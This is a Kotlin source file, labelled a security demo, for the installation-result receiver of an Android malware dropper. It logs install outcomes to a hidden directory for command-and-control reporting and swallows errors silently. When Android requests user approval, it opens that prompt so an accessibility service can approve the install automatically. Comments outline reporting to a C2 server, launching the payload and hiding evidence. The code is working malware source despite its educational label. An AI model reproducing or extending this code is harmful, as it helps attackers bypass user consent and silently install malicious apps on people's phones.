package com.securitydemo.malware.utils

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import java.io.File

/**
 * SECURITY DEMO: Install Result Receiver
 * 
 * This receiver handles the results of package installation attempts:
 * - Monitors installation success/failure
 * - Logs installation attempts for C2 reporting
 * - Triggers post-installation activities
 * - Coordinates with accessibility service
 * 
 * EDUCATIONAL PURPOSE ONLY
 */
class InstallResultReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
        val packageName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
        
        when (status) {
            PackageInstaller.STATUS_SUCCESS -> {
                handleInstallationSuccess(context, packageName)
            }
            PackageInstaller.STATUS_FAILURE -> {
                handleInstallationFailure(context, intent)
            }
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                handlePendingUserAction(context, intent)
            }
        }
    }

    private fun handleInstallationSuccess(context: Context, packageName: String?) {
        logInstallationResult(context, "SUCCESS", packageName, "Installation completed successfully")
        
        // In real malware, this would:
        // 1. Report success to C2 server
        // 2. Start the newly installed malware
        // 3. Hide evidence of installation
        // 4. Begin next phase of attack
    }

    private fun handleInstallationFailure(context: Context, intent: Intent) {
        val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
        logInstallationResult(context, "FAILURE", null, message ?: "Unknown error")
    }

    private fun handlePendingUserAction(context: Context, intent: Intent) {
        // User interaction required - this is where accessibility service helps
        val userActionIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
        
        logInstallationResult(context, "PENDING", null, "User action required - accessibility service will handle")
        
        // Start the user action intent - accessibility service will automate the response
        userActionIntent?.let {
            it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(it)
        }
    }

    private fun logInstallationResult(context: Context, status: String, packageName: String?, message: String) {
        try {
            val logFile = File(context.filesDir, ".system/installation_results.txt")
            logFile.parentFile?.mkdirs()
            
            val timestamp = System.currentTimeMillis()
            val logEntry = "[$timestamp] $status - $packageName - $message\n"
            
            logFile.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }
}
